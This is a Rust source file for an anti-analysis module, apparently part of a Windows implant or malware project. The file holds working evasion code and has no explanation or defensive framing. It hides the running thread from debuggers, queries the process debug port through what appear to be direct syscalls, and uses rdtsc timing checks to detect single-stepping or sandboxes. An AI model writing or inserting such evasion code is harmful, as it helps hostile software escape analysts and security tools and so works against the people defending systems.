//! Anti-analysis: debugger detection, thread hiding, timing checks.

use core::arch::asm;
use std::mem;

use windows::Win32::Foundation::HANDLE;

use crate::syscalls;

const THREAD_HIDE_FROM_DEBUGGER: u32 = 0x11;
const PROCESS_DEBUG_PORT: u32 = 7;

const CURRENT_THREAD: HANDLE = HANDLE(-2isize as *mut _);
const CURRENT_PROCESS: HANDLE = HANDLE(-1isize as *mut _);

pub fn apply_stealth() {
    unsafe {
        syscalls::init();
        let mut hide: u8 = 1;
        let _ = syscalls::nt_set_information_thread(
            CURRENT_THREAD,
            THREAD_HIDE_FROM_DEBUGGER,
            &mut hide as *mut u8 as *mut std::ffi::c_void,
            mem::size_of::<u8>() as u32,
        );
    }
}

pub fn debugger_present() -> bool {
    unsafe {
        syscalls::init();
        let mut port: usize = 0;
        let mut ret_len = 0u32;
        let status = syscalls::nt_query_information_process(
            CURRENT_PROCESS,
            PROCESS_DEBUG_PORT,
            &mut port as *mut usize as *mut std::ffi::c_void,
            mem::size_of::<usize>() as u32,
            &mut ret_len,
        );
        if status >= 0 && port != 0 {
            return true;
        }
    }
    unsafe { windows::Win32::System::Diagnostics::Debug::IsDebuggerPresent().as_bool() }
}

#[cfg(target_arch = "x86_64")]
pub fn rdtsc_anomaly() -> bool {
    let (t0, t1) = unsafe {
        let a: u64;
        let b: u64;
        asm!(
            "rdtsc",
            "shl rdx, 32",
            "or rax, rdx",
            out("rax") a,
            lateout("rdx") _,
        );
        for _ in 0..512 {
            core::hint::black_box(0u8);
        }
        asm!(
            "rdtsc",
            "shl rdx, 32",
            "or rax, rdx",
            out("rax") b,
            lateout("rdx") _,
        );
        (a, b)
    };
    t1.saturating_sub(t0) > 500_000
}

#[cfg(not(target_arch = "x86_64"))]
pub fn rdtsc_anomaly() -> bool {
    false
}

pub fn is_host_restricted() -> bool {
    debugger_present() || rdtsc_anomaly() || super::is_restricted_host()
}

pub fn zeroize(buf: &mut [u8]) {
    for b in buf.iter_mut() {
        *b = 0;
    }
    std::sync::atomic::compiler_fence(std::sync::atomic::Ordering::SeqCst);
}
